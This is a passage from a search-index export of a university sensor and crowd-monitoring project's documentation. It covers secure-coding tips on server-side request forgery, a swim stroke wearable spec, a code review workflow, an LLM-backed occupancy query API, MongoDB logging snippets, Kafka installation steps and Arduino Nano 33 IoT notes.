and the other to send it to a remote data store so that it can't be deleted by the bad actor that may have access to the server's file system.    ","version":"Next","tagName":"h3"},{"title":"10. SERVER-SIDE REQUEST FORGERY (SSRF)​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#10-server-side-request-forgery-ssrf","content":" ","version":"Next","tagName":"h2"},{"title":"Gist​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#gist-9","content":" The server's file system contains data that attackers could use for malicious purposes. &quot;Internal&quot; file requests on the server can be injected by attackers.  ","version":"Next","tagName":"h3"},{"title":"Look Out For​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#look-out-for-9","content":" Don't allow HTTP redirects from user controls. Like (3) make sure any user input is checked and goes through sanitation before use. Change file permissions for sensitive data to only allow access to users other than the one running the program. Use whitelisting for internal network traffic so that even if an attacker passes other security measures they can't bypass the firewall/access control list.  ","version":"Next","tagName":"h3"},{"title":"Example​","type":1,"pageTitle":"Safe Code Guide","url":"/redback-documentation/docs/project-3/SafeCodeGuide#example-9","content":"   Here as soon as the server starts listening any outgoing HTTP request is denied.   ","version":"Next","tagName":"h3"},{"title":"Wearable Swim Stroke Analyser Specifications","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/sensors/swim_stroke_analyser","content":"Last updated by: Brendan Kay, Last updated on: '12/05/2024' Last updated by: Brendan Kay, Last updated on: '12/05/2024' Wearable Swim Stroke Analyser Specifications Description:This device is a compact, wearable device designed for swimmers to wear on their hands. It provides detailed feedback on the force and direction of their swim strokes, as well as mapping the stroke shape through accelerometry. This device aims to help swimmers optimize their technique and performance in the water. Key Features: Force and Pressure Sensors: Measures the magnitude and direction of force exerted during each stroke.Utilizes pressure sensors embedded across the palm and finger regions of a glove- or hand paddle like wearable. Accelerometers: Dual-axis accelerometers to accurately capture the 3D motion and shape of each stroke.Helps in analyzing stroke efficiency and form. Design: Lightweight, waterproof silicone material for minimal interference with natural swimming motions.Flexible and durable to withstand various swimming conditions.Adjustable straps to ensure a snug fit for different hand sizes. Data Transmission: Wireless real-time data transmission to a linked smartphone or tablet via Bluetooth since the device itself is unlikely to have capability to store significant amounts of data.Ideally compatible with iOS and Android devices through a dedicated app. Data Analysis Software: Provides feedback on stroke power and form.Visualizes stroke dynamics with 3D animations to aid in technique improvement.Allows for session-by-session tracking to monitor progress. Battery and Charging: Rechargeable battery would need to support at least 90 minutes continuous swimming and would ideally support up to 6 hours.USB-C charging cable for easy and fast charging. Additional Features: Waterproof up to 50 meters.Ambient temperature sensor to adjust readings based on water temperature as this may impact on force and speed. Applications: Suitable for competitive swimmers, swimming coaches, and swim training programs.Can be used in pools, open water, and controlled training environments.","keywords":"","version":"Next"},{"title":"Code Review Workflow","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-3/workflowdoc","content":"","keywords":"","version":"Next"},{"title":"Flow​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#flow","content":" This document outlines the code review workflow designed to enhance the collaboration, quality, and efficiency of the development process for the ‘Athlete Wearable Sensor’ project. By integrating GitHub and Trello, we aim to streamline code submissions, reviews, and tracking of changes.  ","version":"Next","tagName":"h2"},{"title":"1. Task assignment​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#1-task-assignment","content":" ","version":"Next","tagName":"h2"},{"title":"Trello Board​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#trello-board","content":" Tasks are listed on the Trello board under &quot;Product Backlog’ and moved to ‘Sprint Backlog’ during sprint planning. Developers pick tasks from ‘Sprint Backlog’ and move them to ‘In Progress.  ","version":"Next","tagName":"h3"},{"title":"2. Development and Pull request​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#2-development-and-pull-request","content":" ","version":"Next","tagName":"h2"},{"title":"Branch creation​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#branch-creation","content":" Before starting work, synchronize your local main branchCreate and switch to a new feature branch  ","version":"Next","tagName":"h3"},{"title":"Development​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#development","content":" Developers work on their tasks, develop feature or fix according to the requirements.Commit changes  ","version":"Next","tagName":"h3"},{"title":"Push changes and create Pull requests​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#push-changes-and-create-pull-requests","content":" Push the feature/fix branch to GithubCreate a PR against the main branch and link it to Trello board’ corresponding card.  ","version":"Next","tagName":"h3"},{"title":"3. Review process​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#3-review-process","content":" ","version":"Next","tagName":"h2"},{"title":"Moving to Code Review list​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#moving-to-code-review-list","content":" Developers move the Trello card to “Code review’ list and assign the PR to a reviewer.  ","version":"Next","tagName":"h3"},{"title":"Review process​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#review-process","content":" Reviewers evaluate the PR based on the project's code review guidelines.Reviewers leave comments, suggest changes, or approve the PR.  ","version":"Next","tagName":"h3"},{"title":"Code Review Guidelines​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#code-review-guidelines","content":" Clarity: Code should be clear and understandable.Consistency: Follow the projects coding standards.Efficiency: Code should be optimized for performance.Testing: Changes should include unit or integration tests, as appropriate.  ","version":"Next","tagName":"h3"},{"title":"4. Implementing feedback/Approval​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#4-implementing-feedbackapproval","content":" The developer addresses the feedback, making necessary revisions. The process repeats until all reviewers approve the PR.Once approved, the PR is merged into the main branch.The Trello card is moved to Done.  ","version":"Next","tagName":"h2"},{"title":"5. Monitoring and Continuous Improvement​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#5-monitoring-and-continuous-improvement","content":" ","version":"Next","tagName":"h2"},{"title":"Process Evaluation:​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#process-evaluation","content":" Regularly review the efficiency and effectiveness of the code review process.Make use of feedback from the team and make adjustments to the workflow, guidelines, and tool integrations as necessary to continuously improve the development process.  ","version":"Next","tagName":"h3"},{"title":"Workflow Diagram​","type":1,"pageTitle":"Code Review Workflow","url":"/redback-documentation/docs/project-3/workflowdoc#workflow-diagram","content":"  ","version":"Next","tagName":"h2"},{"title":"Crowd monitoring query system","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#overview","content":" The Crowd monitoring query system is a FastAPI-based application that allows users to query room occupancy records based on specific criteria using an instruction-tuned language model. This system integrates a MongoDB database to store and retrieve occupancy data, while leveraging a pre-trained language model to generate natural language responses based on the queried data.  ","version":"Next","tagName":"h2"},{"title":"Key Features​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#key-features","content":" Query Occupancy: Post room occupancy queries using time and room_id as criteria, and retrieve a natural language response generated by the instruction-tuned language model.Language Model: Uses a locally hosted language model (e.g., GPT-2 or others) to generate responses in a human-friendly way.Database Integration: Connects to a MongoDB collection to fetch and filter occupancy data.Health Check: API health check to ensure the service is up and running.Chat Interface: A chat endpoint to test the language model with custom prompts.  ","version":"Next","tagName":"h2"},{"title":"File Structure​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#file-structure","content":" llms.py: Contains the logic for loading the language model, generating responses, and querying occupancy records.main.py: Implements the FastAPI application, with endpoints for querying occupancy and generating responses from the language model.mongo_connector.py: Provides a connection to MongoDB and functionality to query occupancy records based on provided criteria..env: Holds environment variables such as MongoDB connection URI, database name, collection name, and the language model path.  ","version":"Next","tagName":"h2"},{"title":"Dependencies​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#dependencies","content":" Ensure you have the following installed:  Python 3.12+FastAPI for building the APIpydantic for data validationtorch for PyTorchtransformers for using the pre-trained language modelspymongo for MongoDB integrationdotenv for loading environment variablesunsloth for loading the modelslangchain for interfacing with databases  Create a Conda environment and activate it: conda env create -f environment.yml conda activate llms Configure environment variables: Create a .env file at the root of the project and add the following variables: MONGO_URI=&lt;Your MongoDB URI&gt; DB=&lt;Your MongoDB Database Name&gt; COLLECTION=&lt;Your MongoDB Collection Name&gt; MODEL=&lt;Path or name of the pre-trained language model&gt; HF_TOKEN=&lt;Your Hugging Face token if needed&gt; Run the FastAPI server: fastapi dev main.py Configure environment variables: Create a .env file at the root of the project and add the following variables: MONGO_URI=&lt;Your MongoDB URI&gt; DB=&lt;Your MongoDB Database Name&gt; COLLECTION=&lt;Your MongoDB Collection Name&gt; MODEL=&lt;Path or name of the pre-trained language model&gt; HF_TOKEN=&lt;Your Hugging Face token if needed&gt; // if you are wants to work with unmodified LLAMA3.1 models Important: Ensure you have CUDA installed if you wish to run the model on a GPU.  Here's how you can update the README to include the minimum system requirements for running the API:  ","version":"Next","tagName":"h2"},{"title":"Minimum System Requirements​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#minimum-system-requirements","content":" To run the Occupancy Query Service API with the language model, the following hardware specifications are recommended:  CPU: Intel Core i5 or equivalentRAM: 16 GBGPU: CUDA-compatible GPU (required for running larger models efficiently) For 3.5B parameter models: Minimum 4 GB VRAMFor 8B parameter models: Minimum 6 GB VRAM  Note: If you don't have access to a compatible GPU, the API can still run on CPU, but with significantly slower inference times for larger models. please refer to https://huggingface.co/docs/transformers/main/en/main_classes/quantization#offload-between-cpu-and-gpu    ","version":"Next","tagName":"h2"},{"title":"API Endpoints​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#api-endpoints","content":" ","version":"Next","tagName":"h2"},{"title":"1. /query_occupancy (POST)​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#1-query_occupancy-post","content":" Query the occupancy database and receive a natural language response.  Request Body: { &quot;time&quot;: &quot;2023-09-21T15:00:00&quot;, &quot;room_id&quot;: 101 } Response: { &quot;response&quot;: &quot;The occupancy records are [details of the records].&quot; }   ","version":"Next","tagName":"h3"},{"title":"2. / (GET)​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#2--get","content":" Returns a welcome message.  Response: { &quot;message&quot;: &quot;Welcome to the occupancy query service!&quot; }   ","version":"Next","tagName":"h3"},{"title":"3. /health (GET)​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#3-health-get","content":" Returns the health status of the API.  Response: { &quot;status&quot;: &quot;healthy&quot; }   ","version":"Next","tagName":"h3"},{"title":"4. /chat (GET)​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#4-chat-get","content":" Chat with the language model by passing a custom prompt.  Query Parameter:prompt: String prompt to be processed by the model. Response: { &quot;message&quot;: &quot;Response from the language model based on the prompt.&quot; }   ","version":"Next","tagName":"h3"},{"title":"How it Works​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#how-it-works","content":" Occupancy Querying: The service accepts a query in the form of time and room_id (optional). It retrieves matching records from MongoDB and passes the records as a prompt to the language model to generate a human-readable response. Language Model: A pre-trained language model (loaded using FastLanguageModel) is used for inference. It generates a response based on the occupancy records and any additional prompts. Garbage Collection: To optimize GPU memory usage, garbage collection and GPU memory management are handled using PyTorch’s empty_cache and ipc_collect methods.  ","version":"Next","tagName":"h2"},{"title":"Model Configuration​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#model-configuration","content":" Quantization: The model is loaded with 4-bit quantization (set by load_in_4bit=True) to reduce memory usage.Max Sequence Length: The maximum sequence length for the model is set to 2048, and automatic scaling for RoPE (Rotary Positional Embedding) is enabled.Model Customization: You can replace the current model (e.g., GPT-2) with any compatible transformer model by setting the MODEL environment variable to the desired model name or path.  ","version":"Next","tagName":"h2"},{"title":"To training your custom models please use the notebook from train_llms/Train_llms.ipynb​","type":1,"pageTitle":"Crowd monitoring query system","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/LLMs_training_testing#to-training-your-custom-models-please-use-the-notebook-from-train_llmstrain_llmsipynb","content":"","version":"Next","tagName":"h3"},{"title":"MongoDB","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/Crowd-Monitoring/MongoDB-Overview","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"MongoDB","url":"/redback-documentation/docs/project-4/Crowd-Monitoring/MongoDB-Overview#introduction","content":" MongoDB, a NoSQL database management platform, is utilized in this project to store crowd monitoring data. Given the current focus on tracking crowds and analyzing movement trends, MongoDB is a suitable choice due to its schemaless and non-relational properties, which offer flexibility in handling diverse data types. However, as the project scales and becomes more complex with additional components, transitioning to a standard SQL database may be considered to accommodate the need for more structured data management.  ","version":"Next","tagName":"h2"},{"title":"Installation​","type":1,"pageTitle":"MongoDB","url":"/redback-documentation/docs/project-4/Crowd-Monitoring/MongoDB-Overview#installation","content":" To establish a database on MongoDB, you can easily create the database and clusters by following the instructions provided on the MongoDB website. For cluster configuration, the team will use the free-tier option, which includes 512 MB of storage.  When connecting to MongoDB, it's important to select the appropriate driver and version to ensure you receive the correct instructions, as shown in the image below.    To install the MongoDB driver on your local machine, follow the command line instructions provided below.  python -m pip install &quot;pymongo[srv]&quot;   ","version":"Next","tagName":"h2"},{"title":"Data Recording​","type":1,"pageTitle":"MongoDB","url":"/redback-documentation/docs/project-4/Crowd-Monitoring/MongoDB-Overview#data-recording","content":" The below block has the function of connecting to the MongoDB driver. It would directly access to the CrowdTracking database and Crowd collection  from pymongo import MongoClient client = MongoClient('mongo+srv:// ') db = client[&quot;CrowTracking&quot;] collection = db[&quot;Crowd&quot;]   In regard to real-time crowd monitoring there would be two main approachs.  now = datetime.now() data = { &quot;frame_id&quot;: frame_id, &quot;timestamp&quot;: now.strftime(&quot;%d/%m/%Y %H:%M:%S&quot;), &quot;total_persons&quot;: len(boxes) } collection.insert_one(data)   This code would record the captured data based on every round of loop. The advantage of this approach is that the data would be imported into MongoDB in every frame ID. However, as the recursion os executed hastely, YOLO could process mutiple of frames in a second leading to the burdern of storage.  if current_time - last_update_time &lt; update_interval: now = datetime.now() data = { &quot;frame_id&quot;: frame_id, &quot;timestamp&quot;: now.strftime(&quot;%d/%m/%Y %H:%M:%S&quot;), &quot;total_persons&quot;: len(boxes) } collection.insert_one(data) last_update_time = current_time   With the above code, by setting up a variable for interval time, we can easily adjust this variable to update the recorded data on MongoDB in every second, minute or hour.  ","version":"Next","tagName":"h2"},{"title":"Results​","type":1,"pageTitle":"MongoDB","url":"/redback-documentation/docs/project-4/Crowd-Monitoring/MongoDB-Overview#results","content":"  ","version":"Next","tagName":"h2"},{"title":"Crowd Monitoring & Player Tracking Project Plan: Apache Kafka","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/kafka.tutorial","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Crowd Monitoring & Player Tracking Project Plan: Apache Kafka","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/kafka.tutorial#introduction","content":" As a member of the Crowd Monitoring &amp; Player Tracking team, my primary task is to develop a system for handling data logistics using a document-based database. The focus of my work is on ensuring that the data generated by our monitoring and tracking systems is efficiently and reliably processed, stored, and made available for analysis and visualization.  ","version":"Next","tagName":"h2"},{"title":"Specific Focus on Kafka Data Streaming Pipeline​","type":1,"pageTitle":"Crowd Monitoring & Player Tracking Project Plan: Apache Kafka","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/kafka.tutorial#specific-focus-on-kafka-data-streaming-pipeline","content":" I have chosen to focus on the Kafka data streaming pipeline as a crucial component of our data logistics system. Kafka is well-suited for our needs due to its ability to handle high-throughput, real-time data streams with low latency, which is essential for monitoring and tracking applications where timely data processing is critical.  ","version":"Next","tagName":"h2"},{"title":"Why Kafka?​","type":1,"pageTitle":"Crowd Monitoring & Player Tracking Project Plan: Apache Kafka","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/kafka.tutorial#why-kafka","content":" Kafka was chosen for several reasons:  Scalability: Kafka's distributed architecture allows it to scale horizontally, which is vital as the volume of data from player tracking and crowd monitoring can be substantial.Reliability: Kafka's strong durability guarantees ensure that no data is lost during transmission, which is important for maintaining the integrity of our tracking data.Real-time Processing: Kafka's capability to process data in real-time is a perfect fit for our system's requirement to monitor crowd movement and player tracking as events unfold.  ","version":"Next","tagName":"h2"},{"title":"Key Components of Kafka​","type":1,"pageTitle":"Crowd Monitoring & Player Tracking Project Plan: Apache Kafka","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/kafka.tutorial#key-components-of-kafka","content":" Producers: Entities that publish data to Kafka topics. They push records (data) into Kafka without concern for how the data is processed downstream.Consumers: Entities that read records from Kafka topics. They can be independent processes or applications that subscribe to specific topics to process data.Topics: Categories or feed names to which records are published. Kafka topics are partitioned to allow for parallelism and scalability.Brokers: Kafka brokers are servers that store and serve data. A Kafka cluster consists of multiple brokers, ensuring fault tolerance and distributed storage.Zookeeper: Used by Kafka to manage and coordinate the brokers. It handles leader election for partitions and maintains a list of all brokers in the cluster.  ","version":"Next","tagName":"h2"},{"title":"Installing Apache Kafka​","type":1,"pageTitle":"Crowd Monitoring & Player Tracking Project Plan: Apache Kafka","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/kafka.tutorial#installing-apache-kafka","content":" ","version":"Next","tagName":"h2"},{"title":"On macOS​","type":1,"pageTitle":"Crowd Monitoring & Player Tracking Project Plan: Apache Kafka","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/kafka.tutorial#on-macos","content":" To get started with Kafka on a macOS system, you'll need to install both Kafka and its dependency, Zookeeper. Here's a step-by-step guide:  Prerequisites​  Homebrew: Ensure that Homebrew is installed on your Mac. Homebrew is a popular package manager for macOS that simplifies the installation of software. To install Homebrew, open Terminal and enter: /bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot; Java: Kafka requires Java to run. Install it using Homebrew: brew install openjdk@11   Step-by-Step Installation​  Install Kafka and Zookeeper Install Kafka and Zookeeper using Homebrew: brew install kafka Start Zookeeper Kafka uses Zookeeper to manage its brokers. Start Zookeeper with the following command: zookeeper-server-start /usr/local/etc/kafka/zookeeper.properties Start Kafka Server Once Zookeeper is running, start the Kafka broker: kafka-server-start /usr/local/etc/kafka/server.properties Create a Topic To create a Kafka topic, use the following command: kafka-topics --create --topic test-topic --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1 Send and Receive Messages Start sending messages to the Kafka topic using a producer: kafka-console-producer --topic test-topic --bootstrap-server localhost:9092 To consume messages from the topic, use: kafka-console-consumer --topic test-topic --from-beginning --bootstrap-server localhost:9092   ","version":"Next","tagName":"h3"},{"title":"On Windows​","type":1,"pageTitle":"Crowd Monitoring & Player Tracking Project Plan: Apache Kafka","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/kafka.tutorial#on-windows","content":" To install Kafka on a Windows system, follow these steps:  Prerequisites​  Java: Ensure that Java is installed on your machine. You can download and install it from the Oracle JDK website.Download Kafka: Go to the Apache Kafka download page and download the latest binary for your operating system.  Step-by-Step Installation​  Extract Kafka Extract the downloaded Kafka archive to your desired directory (e.g., C:\\kafka). Configure Environment Variables Add the Kafka bin directory (e.g., C:\\kafka\\bin\\windows) to your system's PATH environment variable. Start Zookeeper Kafka uses Zookeeper to manage its brokers. Start Zookeeper with the following command in a new Command Prompt: zookeeper-server-start.bat C:\\kafka\\config\\zookeeper.properties Start Kafka Server Once Zookeeper is running, start the Kafka broker in another Command Prompt: kafka-server-start.bat C:\\kafka\\config\\server.properties Create a Topic To create a Kafka topic, use the following command: kafka-topics.bat --create --topic test-topic --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1 Send and Receive Messages Start sending messages to the Kafka topic using a producer: kafka-console-producer.bat --topic test-topic --bootstrap-server localhost:9092 To consume messages from the topic, use: kafka-console-consumer.bat --topic test-topic --from-beginning --bootstrap-server localhost:9092   ","version":"Next","tagName":"h3"},{"title":"Using Docker​","type":1,"pageTitle":"Crowd Monitoring & Player Tracking Project Plan: Apache Kafka","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/kafka.tutorial#using-docker","content":" To run Kafka using Docker, follow these steps:  Prerequisites​  Docker: Ensure Docker is installed on your system. You can download Docker from the Docker website.  Step-by-Step Installation​  Create a Docker Network Create a new Docker network for Kafka and Zookeeper: docker network create kafka-network Start Zookeeper Container Run a Zookeeper container: docker run -d --name zookeeper --network kafka-network -e ZOOKEEPER_CLIENT_PORT=2181 confluentinc/cp-zookeeper:latest Start Kafka Container Run a Kafka container: docker run -d --name kafka --network kafka-network -e KAFKA_ZOOKEEPER_CONNECT=zookeeper:2181 -e KAFKA_ADVERTISED_LISTENERS=PLAINTEXT://localhost:9092 -e KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR=1 confluentinc/cp-kafka:latest Create a Topic To create a Kafka topic, use the following command: docker exec -it kafka kafka-topics --create --topic test-topic --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1 Send and Receive Messages Send messages to the Kafka topic using a producer: docker exec -it kafka kafka-console-producer --topic test-topic --bootstrap-server localhost:9092 To consume messages from the topic, use: docker exec -it kafka kafka-console-consumer --topic test-topic --from-beginning --bootstrap-server localhost:9092   ","version":"Next","tagName":"h3"},{"title":"On Linux​","type":1,"pageTitle":"Crowd Monitoring & Player Tracking Project Plan: Apache Kafka","url":"/redback-documentation/docs/project-4/Crowd-Monitoring-Detection/kafka.tutorial#on-linux","content":" To install Kafka on a Linux system, follow these steps:  Prerequisites​  Java: Kafka requires Java to run. You can install it using your package manager. For example, on Ubuntu or Debian: sudo apt update sudo apt install openjdk-11-jdk Download Kafka: Go to the Apache Kafka download page and download the latest binary for your operating system.  Step-by-Step Installation​  Extract Kafka Extract the downloaded Kafka archive to your desired directory (e.g., /opt/kafka). Start Zookeeper Kafka uses Zookeeper to manage its brokers. Start Zookeeper with the following command: /opt/kafka/bin/zookeeper-server-start.sh /opt/kafka/config/zookeeper.properties Start Kafka Server Once Zookeeper is running, start the Kafka broker: /opt/kafka/bin/kafka-server-start.sh /opt/kafka/config/server.properties Create a Topic To create a Kafka topic, use the following command: /opt/kafka/bin/kafka-topics.sh --create --topic test-topic --bootstrap-server localhost:9092 --partitions 1 --replication-factor 1 Send and Receive Messages Start sending messages to the Kafka topic using a producer: /opt/kafka/bin/kafka-console-producer.sh --topic  ","version":"Next","tagName":"h3"},{"title":"Integration of Arduino Nano 33 IoT in Our Project: An Analysis","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/Arduino_Nano_33_IoT_Integration_Analysis","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Integration of Arduino Nano 33 IoT in Our Project: An Analysis","url":"/redback-documentation/docs/project-4/iot/Arduino_Nano_33_IoT_Integration_Analysis#introduction","content":" The Arduino Nano 33 IoT board has been strategically selected as the cornerstone of our player tracking and crowd monitoring project. This choice is driven by the board's advanced features, connectivity options, and compact form factor. This report details how the specifications of the Arduino Nano 33 IoT align with our project's objectives to develop a sophisticated, secure, and scalable monitoring solution.  ","version":"Next","tagName":"h2"},{"title":"Project-Specific Advantages​","type":1,"pageTitle":"Integration of Arduino Nano 33 IoT in Our Project: An Analysis","url":"/redback-documentation/docs/project-4/iot/Arduino_Nano_33_IoT_Integration_Analysis#project-specific-advantages","content":" ","version":"Next","tagName":"h2"},{"title":"1. Real-Time Data Transmission​","type":1,"pageTitle":"Integration of Arduino Nano 33 IoT in Our Project: An Analysis","url":"/redback-documentation/docs/project-4/iot/Arduino_Nano_33_IoT_Integration_Analysis#1-real-time-data-transmission","content":" The Arduino Nano 33 IoT's built-in Wi-Fi and Bluetooth capabilities are critical for our project. These features enable real-time data transmission from the field to our monitoring systems, facilitating immediate analysis and response. This connectivity is essential for tracking players' physical conditions and movements, as well as monitoring crowd dynamics during events.  ","version":"Next","tagName":"h3"},{"title":"2. Enhanced Security for Sensitive Data​","type":1,"pageTitle":"Integration of Arduino Nano 33 IoT in Our Project: An Analysis","url":"/redback-documentation/docs/project-4/iot/Arduino_Nano_33_IoT_Integration_Analysis#2-enhanced-security-for-sensitive-data","content":" With player health data and crowd information classified as sensitive, the onboard ECC608 crypto chip assures high-security standards. It provides secure boot, encrypted data storage, and safe communication channels, ensuring the privacy and integrity of the data collected.  ","version":"Next","tagName":"h3"},{"title":"3. Flexibility in Sensor Integration​","type":1,"pageTitle":"Integration of Arduino Nano 33 IoT in Our Project: An Analysis","url":"/redback-documentation/docs/project-4/iot/Arduino_Nano_33_IoT_Integration_Analysis#3-flexibility-in-sensor-integration","content":" The integration of various sensors, such as the MAX30102 for oximetry readings, is a core requirement of our project. The Arduino Nano 33 IoT’s versatile I/O options and support for multiple communication protocols allow seamless integration with a wide range of sensors. This versatility supports our goal of creating a multi-faceted monitoring system that can assess both individual health metrics and collective crowd dynamics.  ","version":"Next","tagName":"h3"},{"title":"4. Motion Tracking and Orientation Detection​","type":1,"pageTitle":"Integration of Arduino Nano 33 IoT in Our Project: An Analysis","url":"/redback-documentation/docs/project-4/iot/Arduino_Nano_33_IoT_Integration_Analysis#4-motion-tracking-and-orientation-detection","content":" The onboard LSM6DS3 module, a 3D accelerometer and 3D gyroscope, enhances our ability to monitor player movements and orientations, adding a critical dimension to our data collection capabilities. This feature allows us to not only track location but also analyze player performance, detect potential injury risks, and ensure the well-being of individuals in real-time.  ","version":"Next","tagName":"h3"},{"title":"5. Energy Efficiency and Operational Longevity​","type":1,"pageTitle":"Integration of Arduino Nano 33 IoT in Our Project: An Analysis","url":"/redback-documentation/docs/project-4/iot/Arduino_Nano_33_IoT_Integration_Analysis#5-energy-efficiency-and-operational-longevity","content":" Given the extensive operational hours required during events and monitoring sessions, the energy efficiency of the Arduino Nano 33 IoT, powered by the ARM Cortex-M0+ microcontroller, ensures prolonged battery life and continuous operation. This efficiency is crucial for minimizing maintenance and ensuring uninterrupted data collection.  ","version":"Next","tagName":"h3"},{"title":"Project Implementation and Future Considerations​","type":1,"pageTitle":"Integration of Arduino Nano 33 IoT in Our Project: An Analysis","url":"/redback-documentation/docs/project-4/iot/Arduino_Nano_33_IoT_Integration_Analysis#project-implementation-and-future-considerations","content":" The integration of the Arduino Nano 33 IoT into our project is anticipated to significantly enhance our monitoring capabilities. Its compact size and powerful features align with our objectives of developing a discreet yet effective monitoring system. However, it’s important to address potential challenges, such as the learning curve associated with its programming and limitations in processing power for complex real-time data analysis. Strategies will be developed to mitigate these challenges, including targeted training sessions for team members and exploring complementary technologies for data processing needs.  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Integration of Arduino Nano 33 IoT in Our Project: An Analysis","url":"/redback-documentation/docs/project-4/iot/Arduino_Nano_33_IoT_Integration_Analysis#conclusion","content":" The Arduino Nano 33 IoT stands out as the optimal choice for our player tracking and crowd monitoring project, offering a blend of connectivity, security, and flexibility unmatched by other platforms. Its selection is a testament to our commitment to leveraging cutting-edge technology to enhance safety, performance, and experience in sports and event management contexts. As we move forward, the Arduino Nano 33 IoT will serve as the technological backbone of our innovative monitoring solution, promising to redefine the standards of real-time data analysis and application in our field. ","version":"Next","tagName":"h2"},{"title":"Overview of Studied Arduino Programming Concepts","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/Arduino_Programming_Documentation","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Overview of Studied Arduino Programming Concepts","url":"/redback-documentation/docs/project-4/iot/Arduino_Programming_Documentation#introduction","content":" Learning Arduino programming is essential for developing and implementing IoT projects like our player tracking and crowd monitoring system. This document outlines the key programming concepts and skills that have been studied, reflecting on how they underpin the functionality of our project using the Arduino Nano 33 IoT board.  ","version":"Next","tagName":"h2"},{"title":"Fundamental Concepts​","type":1,"pageTitle":"Overview of Studied Arduino Programming Concepts","url":"/redback-documentation/docs/project-4/iot/Arduino_Programming_Documentation#fundamental-concepts","content":" ","version":"Next","tagName":"h2"},{"title":"1. Basics of Arduino IDE​","type":1,"pageTitle":"Overview of Studied Arduino Programming Concepts","url":"/redback-documentation/docs/project-4/iot/Arduino_Programming_Documentation#1-basics-of-arduino-ide","content":" An introduction to the Arduino Integrated Development Environment (IDE) is crucial for anyone starting with Arduino. It's the primary tool used for writing and uploading code to Arduino boards. Understanding how to navigate and utilize the IDE is vital for efficient development.  ","version":"Next","tagName":"h3"},{"title":"2. Structure of Arduino 